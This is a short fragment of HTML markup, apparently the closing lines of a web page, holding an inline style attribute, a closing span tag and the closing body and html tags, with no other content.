style="font-size:14px;padding-top:2em"></span></body></html>